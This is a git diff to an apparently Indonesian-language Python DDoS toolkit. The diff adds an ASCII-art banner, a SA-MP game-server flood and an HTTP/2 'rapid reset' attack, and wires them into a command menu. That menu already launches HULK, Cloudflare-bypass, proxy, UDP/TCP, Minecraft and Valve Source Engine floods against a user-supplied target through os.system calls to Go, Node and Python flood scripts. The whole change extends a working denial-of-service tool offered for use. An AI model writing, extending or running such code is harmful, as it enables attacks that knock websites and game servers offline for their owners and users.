@@ -43,6 +43,34 @@ def countdown(t):
             stdout.write("")
             return
 
+def picture():
+
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"                .  ....                  .,               \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"            .',,,,,,,;;;.              'dOo              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"            .',,'.   ',,.             oKkOd              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"              .''. .                 'KOx0.              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"              ...,cddo;'            .O0d0l              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"               .:clol0Kxkc          d0dOd              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"              .,;;;;cloocol.       cKdkO              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"              ';:c;;clodldd.      .Kxx0.              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"             .;:cd,;,::c,:;.      Okd0'              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"              .',:,,,::o.;c.     dOoOo              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"           ...'''',;;clo,l      ;Kokk              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"       .',;;:ccl:;:,;,'.'.  ...'lolO              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"      .,;::cllllcl:c;:c:o.    .:,;;'              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"       .',::cccloco,ckxkOd:    ,lo   ;              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"       ...,;,;:llcl;:lkdxd,lc.;,,'              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"       ..;:lcllcx:l,,;;oo,.'..c,o,              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"        .';:;;;clcl.,'',,'lOx.'              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"         .',;,;c:c;coxdcoc:;:,'              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"        ...',;::;;coOOOkOOkl.'.              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"       ......':;;,.    .::cc,              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"      .,'   .,:lx.      .;cc:              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"           .,cdo.       .,ld.              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"          .,clx          'cd:              \n")
+        stdout.write(" "+Fore.LIGHTGREEN_EX   +"         'clxx,          .':coc,.              \n")
+
+
 ######################################### user-agent block ###############################################
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -1199,7 +1227,7 @@ def layer7_2():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk2      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-flood "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-rand  "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"rapid      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1239,6 +1267,7 @@ def layer4():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Minecraft Dos attack                   "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"samp  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" tekan ctrl+c untuk stop attack          "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"vse   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Send Valve Source Engine Protocol      "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════╝\n")
     stdout.write("\n")
@@ -1311,34 +1340,40 @@ def command():
         exit()
     elif command == "test":
         target, thread, t = get_info_l7()
+        picture()
         Launch(target, thread, t, "HEAD")
         time.sleep(10)
     elif command == "cfb" or command == "CFB":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchCFB(target, thread, t)
         timer.join()
     elif command == "pxcfb" or command == "PXCFB":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackPXCFB, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "get" or command == "GET":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchRAW(target, thread, t)
         timer.join()
     elif command == "post" or command == "POST":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchPOST(target, thread, t)
         timer.join()
     elif command == "head" or command == "HEAD":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchHEAD(target, thread, t)
@@ -1346,24 +1381,28 @@ def command():
     elif command == "pxraw" or command == "PXRAW":
         if get_proxies():
             target, thread, t = get_info_l7()
+            picture()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXRAW(target, thread, t)
             timer.join()
     elif command == "soc" or command == "SOC":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchSOC(target, thread, t)
         timer.join()
     elif command == "hulk" or command == "HULK":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchHulk(target, thread, t)
         timer.join()
     elif command == "pxhulk" or command == "PXHULK":
         target, thread, t = get_info_l7()
+        picture()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         attackPXHULK(target, thread, t)
@@ -1371,6 +1410,7 @@ def command():
     elif command == "pxsoc" or command == "PXSOC":
         if get_proxies():
             target, thread, t = get_info_l7()
+            picture()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXSOC(target, thread, t)
@@ -1379,6 +1419,7 @@ def command():
         target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
+            picture()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFPRO(target, thread, t)
@@ -1389,6 +1430,7 @@ def command():
         target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
+            picture()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchCFSOC(target, thread, t)
@@ -1397,42 +1439,49 @@ def command():
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
     elif command == "attack":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackSKY, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "spoof":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackspoof, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "bypass":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackbypass, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "pxslow":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackslow, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "http2":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackhttp2, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "stellar":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "strike":
         target, thread, t = get_info_l7()
+        picture()
         threading.Thread(target=LaunchStrike, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
@@ -1440,24 +1489,28 @@ def command():
 
     elif command == "udp" or command == "UDP":
         target, port, thread, t = get_info_l4()
+        picture()
         threading.Thread(target=runsender, args=(target, port, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "tcp" or command == "TCP":
         target, port, thread, t = get_info_l4()
+        picture()
         threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "mine" or command == "MINE":
         target, port, thread, t = get_info_l4()
+        picture()
         threading.Thread(target=runmine, args=(target, port, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "vse" or command == "VSE":
         target, port, thread, t = get_info_l4()
+        picture()
         threading.Thread(target=runvse, args=(target, port, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
@@ -1465,20 +1518,19 @@ def command():
     
     elif command == "hulk2" or command == "HULK2":
         try:
-            target, thread, t = get_info_l7()
-            os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
-            #os.system(f'cd godzilla && go run strike.go -url [url] -method GET')
-            #os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
-            #os.system(f'cd godzilla && go run XCDDOS.go -site {url} -data GET')
-            #os.system(f'cd godzilla && go run Low.go -site {url} -data GET')
-            #os.system("clear")
+            target, thread, t = get_info_l72()
+            picture()
+            os.system(f'cd godzilla && go run Hulk.go -site {target} -data {methode} GET')
+            countdown()
+            os.system("clear")
         except IndexError:
             print('cek lagi')
             print('isi semua pertanyaan dengan benar')
             
     elif command == "TLZ" or command == "tlz" :
         try:
-            target, thread, t = get_info_l7()  
+            target, thread, t = get_info_l7()
+            picture()
             os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
         except IndexError:
             print('cek lagi')
@@ -1486,7 +1538,8 @@ def command():
 
     elif command == "HTTPFLOOD" or command == "httpflood" :
         try:
-            target, thread, methode, t = get_info_l72()    
+            target, thread, methode, t = get_info_l72()
+            picture()
             os.system(f'cd godzilla && go run httpflood.go {target} {thread} {methode} {t} nil')
         except IndexError:
             print('cek lagi')
@@ -1494,7 +1547,8 @@ def command():
 
     elif command == "HTTP-RAND" or command == "http-rand" :
         try:
-            target, thread, t = get_info_l7()    
+            target, thread, t = get_info_l7()
+            picture()
             os.system(f'cd godzilla && node HTTP-RAND.js {target} {t}')
         except IndexError:
             print('cek lagi')
@@ -1502,13 +1556,32 @@ def command():
 
     elif command == "HTTPS2" or command == "https2" :
         try:
-            target, thread, t = get_info_l7()
-            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
+            target, thread, methode, t = get_info_l72()
+            picture()
+            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data {methode} GET')
             os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
             os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
-            os.system(f'cd godzilla && go run strike.go -url [target] -method GET')
+            os.system(f'cd godzilla && go run strike.go -url {target} -method GET')
             os.system(f'cd godzilla && go run Low.go -site {target} -data GET')
             os.system("clear")
+        except IndexError:
+            print('cek lagi')
+            print('isi semua pertanyaan dengan benar')
+            
+    elif command == "SAMP" or command == "samp":
+        try:
+            target, port, thread, t = get_info_l4()
+            picture()
+            os.system(f'cd godzilla && python3 samp.py -i {target} -p {port} -t {t} -th {thread}')
+        except IndexError:
+            print('cek lagi')
+            print('isi semua pertanyaan dengan benar')
+                
+    elif command == "RAPID" or command == "rapid" :
+        try:
+            target, thread, methode, t = get_info_l72()
+            picture()
+            os.system(f'cd godzilla && go run RAPID-RESET.go -site {target} -data {methode}')
         except IndexError:
             print('cek lagi')
             print('isi semua pertanyaan dengan benar')
